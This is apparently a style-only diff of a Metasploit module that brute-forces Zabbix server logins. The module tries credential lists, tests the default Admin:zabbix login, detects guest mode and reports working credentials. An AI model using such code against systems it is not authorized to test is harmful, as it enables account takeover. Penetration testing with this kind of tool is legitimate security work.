@@ -14,24 +14,24 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Zabbix Server Brute Force Utility',
-      'Description'    => %q{
+      'Name' => 'Zabbix Server Brute Force Utility',
+      'Description' => %q{
         This module attempts to login to Zabbix server instance using username and password
         combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options. It
         will also test for the Zabbix default login (Admin:zabbix) and guest access.
       },
-      'Author'         =>
-        [
-          'hdm'
-        ],
-      'License'        => MSF_LICENSE
+      'Author' => [
+        'hdm'
+      ],
+      'License' => MSF_LICENSE
     )
 
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('TARGETURI', [ true,  'The path to the Zabbix server application', '/zabbix/']),
-      ])
+        OptString.new('TARGETURI', [ true, 'The path to the Zabbix server application', '/zabbix/']),
+      ]
+    )
   end
 
   #
@@ -45,12 +45,12 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    print_brute :level=>:status, :ip=>rhost, :msg=>("Found Zabbix version #{@scanner.version}")
+    print_brute :level => :status, :ip => rhost, :msg => ("Found Zabbix version #{@scanner.version}")
 
     if is_guest_mode_enabled?
       print_brute :level => :good, :ip => ip, :msg => "Note: This Zabbix instance has Guest mode enabled"
     else
-      print_brute :level=>:status, :ip=>rhost, :msg=>("This Zabbix instance has disabled Guest mode")
+      print_brute :level => :status, :ip => rhost, :msg => ("This Zabbix instance has disabled Guest mode")
     end
 
     bruteforce(ip)
@@ -59,43 +59,43 @@ class MetasploitModule < Msf::Auxiliary
   def bruteforce(ip)
     @scanner.scan! do |result|
       case result.status
-        when Metasploit::Model::Login::Status::SUCCESSFUL
-          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
-          do_report(ip, rport, result)
-          :next_user
-        when Metasploit::Model::Login::Status::DENIED_ACCESS
-          print_brute :level => :status, :ip => ip, :msg => "Correct credentials, but unable to login: '#{result.credential}'"
-          do_report(ip, rport, result)
-          :next_user
-        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
-          if datastore['VERBOSE']
-            print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
-          end
-          invalidate_login(
-            address: ip,
-            port: rport,
-            protocol: 'tcp',
-            public: result.credential.public,
-            private: result.credential.private,
-            realm_key: result.credential.realm_key,
-            realm_value: result.credential.realm,
-            status: result.status
-          )
-          :abort
-        when Metasploit::Model::Login::Status::INCORRECT
-          if datastore['VERBOSE']
-            print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
-          end
-          invalidate_login(
-            address: ip,
-            port: rport,
-            protocol: 'tcp',
-            public: result.credential.public,
-            private: result.credential.private,
-            realm_key: result.credential.realm_key,
-            realm_value: result.credential.realm,
-            status: result.status
-          )
+      when Metasploit::Model::Login::Status::SUCCESSFUL
+        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
+        do_report(ip, rport, result)
+        :next_user
+      when Metasploit::Model::Login::Status::DENIED_ACCESS
+        print_brute :level => :status, :ip => ip, :msg => "Correct credentials, but unable to login: '#{result.credential}'"
+        do_report(ip, rport, result)
+        :next_user
+      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
+        if datastore['VERBOSE']
+          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
+        end
+        invalidate_login(
+          address: ip,
+          port: rport,
+          protocol: 'tcp',
+          public: result.credential.public,
+          private: result.credential.private,
+          realm_key: result.credential.realm_key,
+          realm_value: result.credential.realm,
+          status: result.status
+        )
+        :abort
+      when Metasploit::Model::Login::Status::INCORRECT
+        if datastore['VERBOSE']
+          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
+        end
+        invalidate_login(
+          address: ip,
+          port: rport,
+          protocol: 'tcp',
+          public: result.credential.public,
+          private: result.credential.private,
+          realm_key: result.credential.realm_key,
+          realm_value: result.credential.realm,
+          status: result.status
+        )
       end
     end
   end
@@ -141,13 +141,13 @@ class MetasploitModule < Msf::Auxiliary
 
     @scanner = Metasploit::Framework::LoginScanner::Zabbix.new(
       configure_http_login_scanner(
-        uri:                datastore['TARGETURI'],
-        cred_details:       @cred_collection,
-        stop_on_success:    datastore['STOP_ON_SUCCESS'],
-        bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
+        uri: datastore['TARGETURI'],
+        cred_details: @cred_collection,
+        stop_on_success: datastore['STOP_ON_SUCCESS'],
+        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
         connection_timeout: 5,
-        http_username:      datastore['HttpUsername'],
-        http_password:      datastore['HttpPassword']
+        http_username: datastore['HttpUsername'],
+        http_password: datastore['HttpPassword']
       )
     )
   end
@@ -162,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
   # Zabbix enables a Guest mode by default that allows access to the dashboard without auth
   def is_guest_mode_enabled?
     dashboard_uri = normalize_uri(datastore['TARGETURI'] + '/' + 'dashboard.php')
-    res = send_request_cgi({'uri'=>dashboard_uri})
+    res = send_request_cgi({ 'uri' => dashboard_uri })
     if (res && res.code == 200 && res.body.to_s =~ /<title>.*: Dashboard<\/title>/)
       return true
     else # Otherwise target is most likely a newer version of Zabbix, so lets try the updated URL.
